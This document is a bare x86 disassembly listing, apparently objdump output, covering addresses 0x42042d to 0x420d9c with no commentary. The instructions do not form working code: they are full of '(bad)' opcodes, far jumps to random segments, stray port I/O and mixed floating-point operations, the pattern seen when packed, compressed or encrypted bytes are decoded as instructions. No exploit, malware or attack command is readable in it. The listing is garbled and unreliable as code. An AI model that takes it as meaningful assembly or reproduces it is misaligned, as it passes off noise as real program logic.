  42042d:	xor    DWORD PTR [eax],esi
  42042f:	mov    cl,BYTE PTR [ebx]
  420431:	test   BYTE PTR [esi+ecx*1-0xc1d1f5d],ah
  420438:	dec    eax
  420439:	sub    BYTE PTR [eax-0x4b],bl
  42043c:	dec    esi
  42043d:	(bad)  
  42043e:	arpl   WORD PTR [edx-0x4850de79],bp
  420444:	jb     0x4203c7
  420446:	jae    0x4203e2
  420448:	xchg   ah,dh
  42044a:	shl    DWORD PTR [ecx+0x19],1
  42044d:	jl     0x420415
  42044f:	stos   BYTE PTR es:[edi],al
  420450:	adc    ch,cl
  420452:	push   0x52
  420454:	mov    dh,0x31
  420456:	jmp    0xbecf:0x8b3b7a5f
  42045d:	add    al,0x22
  42045f:	jecxz  0x4204df
  420461:	cs pop ebx
  420463:	shl    DWORD PTR [eax+eiz*4+0x51a3d187],0xb
  42046b:	or     al,0xd9
  42046d:	sbb    DWORD PTR [ebx],ebx
  42046f:	sbb    esp,ebp
  420471:	lea    esi,ds:0x1936e64a
  420477:	into   
  420478:	or     BYTE PTR [eax+0x5f],bh
  42047b:	sub    eax,0xab453c1d
  420480:	lods   al,BYTE PTR ds:[esi]
  420481:	ss or  dh,0x48
  420485:	test   BYTE PTR [eax-0xc],bl
  420488:	fisubr DWORD PTR [ebx]
  42048a:	fwait
  42048b:	mov    eax,0xec681290
  420490:	jg     0x420430
  420492:	inc    esp
  420493:	fist   DWORD PTR [ebx]
  420495:	cmovbe ebp,DWORD PTR gs:[esi]
  420499:	jae    0x420512
  42049b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42049c:	sbb    esp,DWORD PTR [esi+0x25]
  42049f:	iret   
  4204a0:	arpl   WORD PTR [ebp-0x18bfab06],si
  4204a6:	ds xchg esp,eax
  4204a8:	add    edx,DWORD PTR [ebx+0x6f3f0b3a]
  4204ae:	lods   eax,DWORD PTR ds:[esi]
  4204af:	ins    DWORD PTR es:[edi],dx
  4204b0:	outs   dx,BYTE PTR ds:[esi]
  4204b1:	fs into 
  4204b3:	mov    ds:0x5cedabb4,al
  4204b8:	xchg   ebp,eax
  4204b9:	aam    0x11
  4204bb:	(bad)
  4204bf:	mov    bl,0xb9
  4204c1:	cmp    al,0x6d
  4204c4:	std    
  4204c5:	les    ebx,FWORD PTR [eax]
  4204c7:	pop    edi
  4204c8:	push   edx
  4204c9:	ucomiss xmm4,DWORD PTR [esi-0x6a28582e]
  4204d0:	mov    ah,0x68
  4204d2:	imul   eax,esi,0x1b
  4204d5:	push   0xffffffe1
  4204d7:	das    
  4204d8:	and    BYTE PTR [edx+edx*8-0x3e535c79],bh
  4204df:	pop    esi
  4204e0:	ret    0x2235
  4204e3:	hlt    
  4204e4:	hlt    
  4204e5:	ins    BYTE PTR es:[edi],dx
  4204e6:	cmp    BYTE PTR [eax],dh
  4204e8:	imul   edi,esi,0x77
  4204eb:	xor    ecx,DWORD PTR [esi]
  4204ed:	push   0x7889da6e
  4204f2:	mov    dh,BYTE PTR [ecx-0x45252c1b]
  4204f8:	loope  0x4204d0
  4204fa:	jle    0x4204f2
  4204fc:	xlat   BYTE PTR ds:[ebx]
  4204fd:	pop    eax
  4204fe:	dec    eax
  4204ff:	mov    edx,DWORD PTR [ebx+0x7c]
  420502:	dec    eax
  420503:	ret    0xd1a1
  420506:	cwde   
  420507:	rol    DWORD PTR [edi+0x74],1
  42050a:	iret   
  42050b:	jbe    0x4204ee
  42050d:	pop    ecx
  42050e:	mov    ecx,0xd9c8337e
  420513:	adc    eax,0xfe7d2e82
  420518:	js     0x420532
  42051a:	jo     0x4204f8
  42051c:	sub    dh,BYTE PTR [esi+0x44]
  42051f:	mov    ds:0xd701c0af,al
  420524:	push   edi
  420525:	add    dh,BYTE PTR [ecx+eiz*8-0xe]
  420529:	jmp    0x94d99d11
  42052e:	sub    DWORD PTR [eax+0x49],edx
  420531:	fcomp  DWORD PTR [edx-0x58e4738e]
  420537:	jg     0x4204e4
  420539:	stos   BYTE PTR es:[edi],al
  42053a:	icebp  
  42053b:	fistp  WORD PTR [edi+0x45a6b422]
  420541:	inc    ebx
  420542:	adc    BYTE PTR [edx],bh
  420544:	xchg   ah,ch
  420546:	retf   
  420547:	(bad)  
  420548:	xchg   edi,eax
  420549:	dec    eax
  42054a:	shl    DWORD PTR ds:0xd245b586,0xa9
  420551:	loopne 0x420576
  420553:	mov    edi,0x36337031
  420558:	mov    dl,cl
  42055a:	adc    al,0xa9
  42055c:	adc    eax,0x32889792
  420561:	add    al,0x29
  420563:	and    BYTE PTR [edx],dh
  420565:	jmp    0x60cd:0xba95da04
  42056c:	push   0x4b2008c0
  420571:	adc    esi,DWORD PTR [esi-0x2f]
  420574:	push   0xffffffab
  420576:	les    esi,FWORD PTR ds:0x84be1f1e
  42057c:	retf   0x468f
  42057f:	bound  ecx,QWORD PTR [esi+0x22]
  420582:	hlt    
  420583:	adc    edi,DWORD PTR [ebp+ebp*4-0x75a45011]
  42058a:	xor    DWORD PTR [ebp+0x4f3ccdb],esi
  420590:	je     0x420574
  420592:	and    ecx,ebx
  420594:	xor    DWORD PTR [ebp*4+0x264ebd54],ebx
  42059b:	jne    0x420586
  42059d:	(bad)  
  42059e:	out    dx,eax
  42059f:	retf   0x5e86
  4205a2:	in     eax,dx
  4205a3:	test   eax,edi
  4205a5:	bound  eax,QWORD PTR [esi+0x7a]
  4205a8:	iret   
  4205a9:	std    
  4205aa:	rol    BYTE PTR [ecx+ebp*4-0x11],0x28
  4205af:	xchg   ebx,eax
  4205b0:	cmp    DWORD PTR [ebp+0x4da109],eax
	...
  420786:	add    BYTE PTR [eax],al
  420788:	add    bh,al
  42078a:	stc    
  42078b:	out    0xe3,eax
  42078d:	(bad)  
  42078e:	inc    edi
  420790:	std    
  420791:	fidivr WORD PTR [ebx]
  420793:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420794:	dec    esp
  420795:	adc    BYTE PTR [esi-0x41c42d49],dh
  42079b:	add    DWORD PTR [eax],eax
  42079d:	and    BYTE PTR [edi],al
  42079f:	add    BYTE PTR [eax],al
  4207a1:	xchg   ebx,eax
  4207a2:	ins    BYTE PTR es:[edi],dx
  4207a3:	ss retf 0xfbfe
  4207a7:	pop    ss
  4207a8:	mov    bh,0x5c
  4207aa:	ins    BYTE PTR es:[edi],dx
  4207ab:	xchg   esp,eax
  4207ac:	in     al,0x3a
  4207ae:	mov    ds:0xf1a0788c,al
  4207b3:	dec    eax
  4207b4:	loop   0x4207b5
  4207b6:	mov    edi,0x89b70d6
  4207bb:	push   0xffffffe2
  4207bd:	cmp    dh,ch
  4207bf:	adc    ch,BYTE PTR [esp+eiz*2+0x3f]
  4207c3:	jmp    FWORD PTR [esi-0x56]
  4207c6:	jmp    0xd33:0x68323f3a
  4207cd:	clc    
  4207ce:	mov    bh,0x68
  4207d0:	mov    ecx,0xe869923d
  4207d5:	mov    eax,ds:0x4a3c1dac
  4207da:	dec    ebx
  4207db:	call   0x8735f27
  4207e0:	hlt    
  4207e1:	xchg   edi,eax
  4207e2:	xchg   BYTE PTR [esi+edi*8],ah
  4207e5:	jmp    0xc1f9:0x3cb67582
  4207ec:	jge    0x4207c0
  4207ee:	(bad)  
  4207ef:	aad    0x4a
  4207f1:	in     eax,0xeb
  4207f3:	fistp  DWORD PTR [esi]
  4207f5:	xchg   edi,eax
  4207f6:	out    0x1a,eax
  4207f8:	mov    ss,WORD PTR [ebx-0x1d]
  4207fb:	sbb    DWORD PTR [ecx],0x7d
  4207fe:	in     eax,dx
  4207ff:	dec    ebp
  420800:	inc    edx
  420801:	xor    eax,0x4fff0095
  420806:	stc    
  420807:	pop    es
  420808:	jmp    0x3c258e8b
  42080d:	dec    ebx
  42080e:	daa    
  42080f:	sahf   
  420810:	mov    bh,0xe4
  420812:	xor    DWORD PTR [eax],edi
  420814:	retf   0x66ab
  420817:	inc    DWORD PTR ds:[ebx]
  42081a:	xor    BYTE PTR [ebp-0x50],al
  42081d:	jp     0x42088e
  42081f:	mov    ah,0x24
  420821:	scas   eax,DWORD PTR es:[edi]
  420822:	inc    edx
  420823:	xor    BYTE PTR [edx+0x18],dh
  420826:	call   0xeb96:0xa7c936e5
  42082d:	dec    edi
  42082e:	or     eax,0xafd3c1a0
  420833:	xor    ebx,edx
  420835:	sbb    eax,0x9085e460
  42083a:	dec    ecx
  42083b:	or     eax,0x5b993a4e
  420840:	push   ecx
  420841:	push   edi
  420842:	mov    dh,0x14
  420844:	push   ebp
  420845:	retf   
  420846:	out    dx,eax
  420847:	pop    edi
  420848:	pop    es
  420849:	and    edx,esp
  42084b:	imul   ebx,esp,0x74
  42084e:	add    BYTE PTR [ebx+0x5dc022ea],ah
  420854:	in     al,0x62
  420856:	nop    ebx
  420859:	fistp  QWORD PTR [edx-0x57b4926d]
  42085f:	or     DWORD PTR [edi-0x2e],ebp
  420862:	cdq    
  420863:	add    al,0x9c
  420865:	imul   ecx,edx,0x41
  420868:	xlat   BYTE PTR ds:[ebx]
  420869:	packsswb mm7,QWORD PTR [eax+0x73]
  42086d:	adc    ebx,DWORD PTR [ebp+edx*1+0xbd54b76]
  420874:	(bad)  
  420875:	in     al,dx
  420876:	push   ds
  420877:	test   BYTE PTR [esi-0x14bf0737],ah
  42087d:	rol    BYTE PTR [ebx+edi*1-0x5f7df118],cl
  420884:	ret    
  420885:	int    0x8d
  420887:	jne    0x4208f8
  420889:	pop    ecx
  42088a:	rcr    dh,0x3c
  42088d:	ss dec edi
  42088f:	sbb    ch,ch
  420891:	inc    ecx
  420892:	aas    
  420893:	jnp    0x420862
  420895:	push   ebp
  420896:	add    esp,esp
  420898:	fcmovnu st,st(4)
  42089a:	adc    cl,BYTE PTR [eax+0x3b0e961f]
  4208a0:	mov    al,0xdc
  4208a2:	scas   eax,DWORD PTR es:[edi]
  4208a3:	neg    BYTE PTR [ebp-0x65917de4]
  4208a9:	and    ch,BYTE PTR [esi]
  4208ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4208ac:	and    dh,BYTE PTR [esi]
  4208ae:	add    edx,DWORD PTR [edx+0x4e]
  4208b1:	or     eax,0x8854c2e9
  4208b6:	jg     0x4208f9
  4208b8:	mov    dl,0x14
  4208ba:	outs   dx,DWORD PTR ds:[esi]
  4208bb:	adc    ecx,DWORD PTR [ebx+esi*4-0x2ba057ce]
  4208c2:	test   al,0x77
  4208c4:	(bad)
  4208c8:	(bad)  
  4208c9:	in     al,dx
  4208ca:	dec    esi
  4208cb:	dec    edi
  4208cc:	mov    dl,0x40
  4208ce:	jo     0x420873
  4208d0:	in     eax,0x12
  4208d2:	jmp    0x420924
  4208d4:	mov    ds:0x55b38c1e,eax
  4208d9:	stos   DWORD PTR es:[edi],eax
  4208da:	bound  esp,QWORD PTR ss:[edx-0x7e3596da]
  4208e1:	dec    esp
  4208e2:	mov    ds:0x455fdf83,eax
  4208e7:	push   ss
  4208e8:	retf   
  4208e9:	popa   
  4208ea:	mov    DWORD PTR [edi-0x1ec21dd6],edx
  4208f0:	aad    0x3
  4208f2:	mov    edi,0x84723631
  4208f7:	lds    ecx,FWORD PTR [esi]
  4208f9:	call   0xe327cc89
  4208fe:	jo     0x42096b
  420900:	jae    0x4208db
  420902:	adc    esi,esp
  420904:	ins    DWORD PTR es:[edi],dx
  420905:	ins    DWORD PTR es:[edi],dx
  420906:	cmp    al,BYTE PTR cs:[edx+0x77]
  42090a:	dec    edi
  42090b:	or     al,0x5
  42090d:	dec    edx
  42090e:	inc    ecx
  42090f:	addr16 (bad) 
  420911:	sbb    BYTE PTR [esi],ch
  420913:	call   0xe2ee93a8
  420918:	into   
  420919:	pop    eax
  42091a:	xor    al,0x7b
  42091c:	unpckhps xmm7,XMMWORD PTR [edi+ebp*8+0x6e]
  420921:	jbe    0x4208bb
  420923:	lods   eax,DWORD PTR ds:[esi]
  420924:	mov    esi,0xb4d905f5
  420929:	jp     0x4208c7
  42092b:	pop    ebx
  42092c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42092d:	pop    eax
  42092e:	jns    0x4208ca
  420930:	push   edx
  420931:	cmc    
  420932:	sbb    DWORD PTR [ebp+0x52],ecx
  420935:	sti    
  420936:	in     al,0xf2
  420938:	pop    edx
  420939:	sub    edi,eax
  42093b:	call   0x7333:0xebea321b
  420942:	add    al,BYTE PTR [esi]
  420944:	ds sub esp,esp
  420947:	or     bl,BYTE PTR [edx-0x3687ec72]
  42094d:	pop    esi
  42094e:	sub    eax,0xd1c2c91e
  420953:	not    DWORD PTR [ebp-0x5d]
  420956:	(bad)  
  420957:	mov    ah,0xf2
  420959:	sub    al,0xe3
  42095b:	xor    al,0xa0
  42095d:	mov    ebp,0x90c485c5
  420962:	in     eax,0xec
  420964:	ss push ebx
  420966:	inc    eax
  420967:	push   edx
  420968:	cmp    dh,BYTE PTR [esi+0x3168886c]
  42096e:	aam    0xdc
  420970:	xchg   ebx,eax
  420971:	cmp    DWORD PTR [eax-0x553354ab],eax
  420977:	cs stos DWORD PTR es:[edi],eax
  420979:	mov    ecx,DWORD PTR [ebx+0x7459e33b]
  42097f:	jmp    0x420977
  420981:	cld    
  420982:	adc    DWORD PTR gs:[ebx-0x34],esp
  420986:	mov    eax,ds:0x1f0dd52e
  42098b:	mov    bh,0x3b
  42098d:	or     DWORD PTR [ebp-0x5c],ecx
  420990:	mov    DWORD PTR [ebx+ebx*4],ebp
  420993:	sub    ebp,esp
  420995:	jnp    0x4209d3
  420997:	enter  0x68bf,0xf1
  42099b:	dec    ebp
  42099c:	fadd   DWORD PTR ds:0x39607a34
  4209a2:	test   al,0x45
  4209a4:	mov    cl,0x9b
  4209a6:	add    BYTE PTR ds:0xab4a27cf,cl
  4209ac:	mov    eax,gs:0xfb43412f
  4209b2:	aam    0xaa
  4209b4:	jge    0x420956
  4209b6:	in     eax,dx
  4209b7:	(bad)  
  4209b8:	in     eax,0x38
  4209ba:	addr16 out dx,eax
  4209bc:	add    edx,DWORD PTR [ecx-0x67162567]
  4209c2:	cdq    
  4209c3:	mov    edx,0xc765f094
  4209c8:	sbb    edi,ebx
  4209ca:	push   ds
  4209cb:	(bad)  
  4209cc:	int    0x31
  4209ce:	mov    ch,0xf8
  4209d0:	loope  0x420981
  4209d2:	inc    ebp
  4209d3:	adc    esi,edx
  4209d5:	int3   
  4209d6:	cs dec ecx
  4209d8:	sub    dl,bl
  4209da:	in     eax,dx
  4209db:	frndint 
  4209dd:	mov    eax,ds:0xf95b9023
  4209e2:	push   edi
  4209e3:	cld    
  4209e4:	and    al,0x45
  4209e6:	repz test eax,0x4438c051
  4209ec:	outs   dx,DWORD PTR ds:[esi]
  4209ed:	out    0xdb,eax
  4209ef:	xor    BYTE PTR [eax],0x4b
  4209f2:	or     BYTE PTR ds:0x5db1e624,bl
  4209f8:	jmp    0x4209a6
  4209fa:	(bad)  
  4209fb:	jmp    0xbe2bec27
  420a00:	stos   BYTE PTR es:[edi],al
  420a01:	ja     0x420989
  420a03:	mov    ch,0x3a
  420a05:	jp     0x42099a
  420a07:	dec    ebx
  420a08:	mov    bh,0x92
  420a0a:	or     bh,BYTE PTR [edi+0x7d]
  420a0d:	sub    eax,0x50da33f
  420a12:	sti    
  420a13:	loopne 0x4209e9
  420a15:	jp     0x420a22
  420a17:	add    dl,BYTE PTR [edi-0x1cde802]
  420a1d:	inc    ebp
  420a1e:	pop    edi
  420a1f:	lock inc ecx
  420a21:	enter  0x1b67,0x63
  420a25:	nop
  420a26:	mov    ds:0x33a2edcd,eax
  420a2b:	mov    ecx,0xf006a9ab
  420a30:	xchg   ebp,eax
  420a31:	sbb    eax,0x890538a0
  420a36:	lds    ebp,FWORD PTR [edi+0xa11da5e]
  420a3c:	xchg   dh,bh
  420a3e:	lods   al,BYTE PTR ds:[esi]
  420a3f:	or     DWORD PTR [eax+0x669e7b75],ebx
  420a45:	in     al,dx
  420a46:	push   ebx
  420a47:	ds imul edi,ebx,0x72e2d9e6
  420a4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a4f:	pop    ds
  420a50:	pop    ebp
  420a51:	mov    al,ds:0x4672ef4c
  420a56:	push   ds
  420a57:	out    dx,al
  420a58:	mov    ebp,DWORD PTR [esi]
  420a5a:	cmc    
  420a5b:	jns    0x4209ed
  420a5d:	xchg   esp,eax
  420a5e:	call   0xb49580b0
  420a63:	retf   
  420a64:	les    eax,FWORD PTR [ebp+ebx*2-0x45]
  420a68:	inc    ebp
  420a69:	push   ds
  420a6a:	addr16 mov ds:0xb93f,al
  420a6e:	xor    al,0xfd
  420a70:	sbb    BYTE PTR [ebx+0x206a8111],ah
  420a76:	dec    esi
  420a77:	push   es
  420a78:	mul    DWORD PTR [edi-0x6d070ec9]
  420a7e:	imul   esi,edi,0x981c84c1
  420a84:	inc    ecx
  420a85:	inc    ebp
  420a86:	jae    0x420a74
  420a88:	jb     0x420a36
  420a8a:	add    eax,0x478ec014
  420a8f:	sbb    ah,BYTE PTR [edi-0x21a5af8f]
  420a95:	outs   dx,DWORD PTR ds:[esi]
  420a96:	(bad)  
  420a97:	push   ecx
  420a98:	inc    esi
  420a99:	mov    BYTE PTR [edx-0x1a],bl
  420a9c:	lods   eax,DWORD PTR ds:[esi]
  420a9d:	mov    al,ds:0xa45bee49
  420aa2:	test   eax,0x9479fe2e
  420aa7:	xchg   ecx,eax
  420aa8:	lods   al,BYTE PTR ds:[esi]
  420aa9:	inc    eax
  420aaa:	push   edi
  420aab:	out    dx,eax
  420aac:	pop    ecx
  420aad:	push   esp
  420aae:	icebp  
  420aaf:	(bad)  
  420ab0:	xlat   BYTE PTR ds:[ebx]
  420ab1:	sbb    BYTE PTR [ebx-0x19],cl
  420ab4:	sbb    BYTE PTR [ecx+0x6a],cl
  420ab7:	xchg   esp,eax
  420ab8:	dec    esi
  420ab9:	push   0x65
  420abb:	dec    edx
  420abc:	mov    esp,0x19e1c71c
  420ac1:	push   0x4a
  420ac3:	es inc edx
  420ac5:	stos   BYTE PTR es:[edi],al
  420ac6:	ja     0x420ac6
  420ac8:	lods   eax,DWORD PTR ds:[esi]
  420ac9:	sub    al,0x33
  420acb:	lahf   
  420acc:	adc    al,0x42
  420ace:	daa    
  420acf:	sub    eax,0x73a1a819
  420ad4:	mov    ebx,0x6e9ac232
  420ad9:	add    DWORD PTR [ebx-0x70bb9607],ebx
  420adf:	hlt    
  420ae0:	je     0x420b53
  420ae2:	push   edx
  420ae3:	cmp    eax,0xdedfad66
  420ae8:	fisttp WORD PTR [ecx+ebp*2+0x34]
  420aec:	ret    
  420aed:	repnz leave 
  420aef:	fnsave [ecx-0x1]
  420af2:	jmp    0xc1590f4
  420af7:	xlat   BYTE PTR ds:[ebx]
  420af8:	jp     0x420b07
  420afa:	add    BYTE PTR [edx],ah
  420afc:	dec    ebp
  420afd:	mov    ss,WORD PTR [esi-0x23]
  420b00:	add    ebx,DWORD PTR [ecx]
  420b02:	mov    ah,0xa3
  420b04:	lods   al,BYTE PTR ds:[esi]
  420b05:	and    al,0xf2
  420b07:	jmp    0x420b42
  420b09:	daa    
  420b0a:	aaa    
  420b0b:	or     ebx,edi
  420b0d:	jg     0x420b42
  420b0f:	adc    ch,BYTE PTR [edx]
  420b11:	stc    
  420b12:	mov    bh,0x3d
  420b14:	xchg   ebx,eax
  420b15:	aas    
  420b16:	ins    DWORD PTR es:[edi],dx
  420b17:	cmp    BYTE PTR [eax],0x69
  420b1a:	loope  0x420b20
  420b1c:	xchg   dh,dl
  420b1e:	push   ss
  420b1f:	mov    ecx,0x749c9f60
  420b24:	adc    al,0x69
  420b26:	sbb    ch,ah
  420b28:	push   ss
  420b29:	mov    ds:0x18dd68f8,al
  420b2e:	into   
  420b2f:	inc    ebx
  420b30:	cmp    DWORD PTR [edi+0x7a],ebx
  420b33:	pop    ss
  420b34:	outs   dx,DWORD PTR ds:[esi]
  420b35:	test   bl,bl
  420b37:	mov    bh,cl
  420b39:	add    al,0x65
  420b3b:	arpl   WORD PTR [edx-0x49ac4b92],cx
  420b41:	jne    0x420b97
  420b43:	test   BYTE PTR [eax+0x58],al
  420b46:	jl     0x420bbc
  420b48:	cwde   
  420b49:	shr    BYTE PTR [eax+esi*4+0x129175a9],cl
  420b50:	loop   0x420b65
  420b52:	mov    dl,dl
  420b54:	scas   eax,DWORD PTR es:[edi]
  420b55:	stc    
  420b56:	xchg   esp,eax
  420b57:	pop    ss
  420b58:	sub    bl,BYTE PTR cs:[ebx+0x2ac53de]
  420b5f:	inc    edi
  420b60:	std    
  420b61:	pmaxub mm7,QWORD PTR [ebx-0x22]
  420b65:	inc    ebp
  420b66:	lods   al,BYTE PTR ds:[esi]
  420b67:	and    eax,0xe7526f0
  420b6c:	pop    ecx
  420b6d:	hlt    
  420b6e:	sub    ecx,DWORD PTR [esi+0x1c0a2f32]
  420b74:	dec    ebx
  420b75:	and    BYTE PTR [edx+eiz*1+0xe],0x61
  420b7a:	and    esi,DWORD PTR [ebx-0x45]
  420b7d:	iret   
  420b7e:	test   eax,0x2686f9ca
  420b83:	(bad)  
  420b84:	mov    BYTE PTR [ebx+edi*2-0x74],dl
  420b88:	inc    esp
  420b89:	sbb    al,0xe3
  420b8b:	arpl   WORD PTR [ecx+0x226108d6],si
  420b91:	xlat   BYTE PTR ds:[ebx]
  420b92:	lods   al,BYTE PTR ds:[esi]
  420b93:	jnp    0x420b9c
  420b95:	lea    esi,[edi+0x431b6368]
  420b9b:	(bad)  
  420b9e:	sub    al,0x3c
  420ba0:	test   al,0x1d
  420ba2:	sar    DWORD PTR [edi+0x42],0x8d
  420ba6:	test   ah,al
  420ba8:	ins    BYTE PTR es:[edi],dx
  420ba9:	in     al,0x83
  420bab:	outs   dx,DWORD PTR ds:[esi]
  420bac:	js     0x420c1a
  420bae:	push   ecx
  420baf:	lods   al,BYTE PTR ds:[esi]
  420bb0:	xchg   ebp,eax
  420bb1:	ficom  WORD PTR [eax+eiz*4+0x200acaf1]
  420bb8:	mov    ebx,0x3a9e1a3f
  420bbd:	sbb    edx,DWORD PTR [eax+edi*8+0x10]
  420bc1:	mov    eax,0x83d51c19
  420bc6:	sar    DWORD PTR [ebx+0x57671b74],cl
  420bcc:	(bad)  
  420bcd:	push   ebx
  420bce:	mov    edi,0x711286a0
  420bd3:	call   0xb534:0xd1e32dfb
  420bda:	dec    eax
  420bdb:	mov    edx,DWORD PTR [ecx-0x1b10d72d]
  420be1:	inc    eax
  420be2:	ret    
  420be3:	and    bl,BYTE PTR [edi]
  420be5:	sbb    DWORD PTR [edx+0x177dd957],0xffffff8a
  420bec:	push   ss
  420bed:	daa    
  420bee:	das    
  420bef:	pop    esi
  420bf0:	add    BYTE PTR [eax+0x56dc7aa6],bl
  420bf6:	outs   dx,BYTE PTR ds:[esi]
  420bf7:	mov    BYTE PTR ds:0x7bd4b336,dh
  420bfd:	mov    eax,ds:0xf5ef1ef7
  420c02:	daa    
  420c03:	and    esi,DWORD PTR [ebp+0x4a761bee]
  420c09:	lods   al,BYTE PTR ds:[esi]
  420c0a:	mov    BYTE PTR [edi+0x8],0x1f
  420c0e:	sysenter 
  420c10:	cld    
  420c11:	lods   al,BYTE PTR ds:[esi]
  420c12:	daa    
  420c13:	dec    edx
  420c14:	ins    DWORD PTR es:[edi],dx
  420c15:	ss xchg ebp,eax
  420c17:	sbb    ecx,DWORD PTR [bp+si-0x7e30]
  420c1c:	pop    edi
  420c1d:	sub    esp,DWORD PTR [ebx+0x1e]
  420c20:	sar    DWORD PTR [ebp-0x4a47623d],0xe3
  420c27:	scas   al,BYTE PTR es:[edi]
  420c28:	loop   0x420ca3
  420c2a:	jns    0x420bbf
  420c2c:	int    0x95
  420c2e:	cmp    DWORD PTR [ebx],edx
  420c30:	jns    0x420c56
  420c32:	adc    al,0xbd
  420c34:	ins    BYTE PTR es:[edi],dx
  420c35:	pop    esp
  420c36:	stc    
  420c37:	or     al,0x57
  420c39:	ins    DWORD PTR es:[edi],dx
  420c3a:	cmp    DWORD PTR [edi-0x2f66ec5f],0x35
  420c41:	push   esi
  420c42:	ror    BYTE PTR [ecx-0x1f],1
  420c45:	lods   al,BYTE PTR ds:[esi]
  420c46:	pop    esi
  420c47:	fdivr  DWORD PTR [esi]
  420c49:	addr16 shr dh,cl
  420c4c:	mov    ch,0x5f
  420c4e:	shl    BYTE PTR [eax],1
  420c50:	dec    edi
  420c51:	daa    
  420c52:	cli    
  420c53:	out    0xe8,al
  420c55:	xor    ah,BYTE PTR fs:[ebx-0x79]
  420c59:	pop    edi
  420c5a:	ins    DWORD PTR es:[edi],dx
  420c5b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c5c:	pusha  
  420c5d:	cdq    
  420c5e:	ds add ecx,ebx
  420c61:	xor    ch,BYTE PTR [edi+0x74cbfc81]
  420c67:	mov    dh,0x8e
  420c69:	push   esi
  420c6a:	lock push ds
  420c6c:	adc    BYTE PTR [eax-0x312a08b4],ah
  420c72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c73:	add    BYTE PTR [eax],cl
  420c75:	or     ecx,DWORD PTR ds:0xeb002a72
  420c7b:	std    
  420c7c:	cmp    cl,BYTE PTR [edi]
  420c7e:	mov    cl,0xd8
  420c80:	inc    ecx
  420c81:	cmp    eax,0xe9f4ee11
  420c86:	cld    
  420c87:	mov    dl,0xe5
  420c89:	test   BYTE PTR [edi+0x129db172],0x75
  420c90:	call   0xd123fbbe
  420c95:	popa   
  420c96:	xor    eax,0x1ff1a1ac
  420c9b:	push   cs
  420c9c:	add    DWORD PTR [edi+eiz*4-0x72],ebx
  420ca0:	dec    eax
  420ca1:	mov    eax,ds:0xf320ea5e
  420ca6:	mov    eax,ds:0x7d18d427
  420cab:	mov    ch,0x86
  420cad:	aaa    
  420cae:	inc    edx
  420caf:	mov    edx,0x4d762ecb
  420cb4:	int    0xab
  420cb6:	mov    ecx,0xf6120d0c
  420cbb:	pushf  
  420cbc:	ss scas al,BYTE PTR es:[edi]
  420cbe:	xchg   edi,eax
  420cbf:	jbe    0x420d30
  420cc1:	repz bound ebx,QWORD PTR [edx+0x7b]
  420cc5:	test   al,0x39
  420cc7:	mov    ds:0xdbfa80f8,al
  420ccc:	inc    esp
  420ccd:	iret   
  420cce:	loope  0x420ca2
  420cd0:	lock mov ds:0xaaf0fe99,al
  420cd6:	pop    edx
  420cd7:	cs jb  0x420d53
  420cda:	scas   al,BYTE PTR es:[edi]
  420cdb:	test   al,0xde
  420cdd:	ficomp WORD PTR [ebx+0x75]
  420ce0:	xchg   ebp,eax
  420ce1:	adc    BYTE PTR ds:0x9dd0e037,bl
  420ce7:	cmp    bh,bl
  420ce9:	cdq    
  420cea:	mov    ss,WORD PTR [ebp+0x24]
  420ced:	add    DWORD PTR [edi],ecx
  420cef:	and    ebp,DWORD PTR [ebp+0x26]
  420cf2:	jae    0x420d0e
  420cf4:	sbb    bl,BYTE PTR [eax+0xd9a2b80]
  420cfa:	and    edi,ebx
  420cfc:	push   ebx
  420cfd:	(bad)  
  420cff:	inc    edx
  420d00:	in     al,0x9d
  420d02:	(bad)  
  420d03:	cmp    cl,BYTE PTR [eax]
  420d05:	stos   BYTE PTR es:[edi],al
  420d06:	xor    dh,al
  420d08:	ins    DWORD PTR es:[edi],dx
  420d09:	pop    ss
  420d0a:	fwait
  420d0b:	inc    edx
  420d0c:	and    edi,edx
  420d0e:	stc    
  420d0f:	cmc    
  420d10:	xchg   ebp,eax
  420d11:	out    0x53,al
  420d13:	cmp    eax,ebx
  420d15:	fwait
  420d16:	std    
  420d17:	add    esi,edi
  420d19:	fwait
  420d1a:	imul   ebx,DWORD PTR [ecx],0xffffff93
  420d1d:	sub    ebp,ebx
  420d1f:	pop    eax
  420d20:	pop    esi
  420d21:	lds    ecx,FWORD PTR [ecx]
  420d23:	div    ch
  420d25:	fisttp QWORD PTR [edx+0x41]
  420d28:	pop    eax
  420d29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d2a:	pop    ss
  420d2b:	push   0x3b
  420d2d:	scas   al,BYTE PTR es:[edi]
  420d2e:	repnz cmp DWORD PTR [edi+0x45a41e06],0xffffff87
  420d36:	dec    eax
  420d37:	fwait
  420d38:	xor    DWORD PTR [edx],esi
  420d3a:	jmp    0xf211bcbf
  420d3f:	sub    BYTE PTR [ebp-0x26],ch
  420d42:	daa    
  420d43:	push   ss
  420d44:	add    eax,0x173e5003
  420d49:	xor    ch,BYTE PTR [esi-0x2a]
  420d4c:	mov    ecx,DWORD PTR [edx-0x5e]
  420d4f:	push   ss
  420d50:	(bad)
  420d54:	(bad)  
  420d55:	xor    eax,0xcbe9ca90
  420d5a:	sbb    DWORD PTR [eax-0x2a171a5f],edi
  420d60:	loop   0x420dd1
  420d62:	cmp    DWORD PTR ds:[edi+0x27],esi
  420d66:	fcomp  DWORD PTR [ebx+0x78]
  420d69:	data16 xor al,0xc2
  420d6c:	call   0xa0c9fc07
  420d71:	jl     0x420d24
  420d73:	sub    DWORD PTR [edi+edx*4],esp
  420d76:	mov    BYTE PTR [ebx+0x50a6fcba],ch
  420d7c:	sti    
  420d7d:	out    0x99,eax
  420d7f:	inc    ebx
  420d80:	jge    0x420d90
  420d82:	dec    esp
  420d83:	dec    ecx
  420d84:	or     al,0xd1
  420d86:	stos   DWORD PTR es:[edi],eax
  420d87:	imul   eax,edx
  420d8a:	int3   
  420d8b:	push   ds
  420d8c:	add    BYTE PTR [ebp+esi*8-0x9],ch
  420d90:	clc    
  420d91:	cmp    eax,0x8c444886
  420d96:	(bad)  
  420d97:	mov    dh,0x89
  420d99:	nop
  420d9a:	(bad)  
  420d9c:	cmp    DWORD PTR [edi+0x6d8208ed],esp
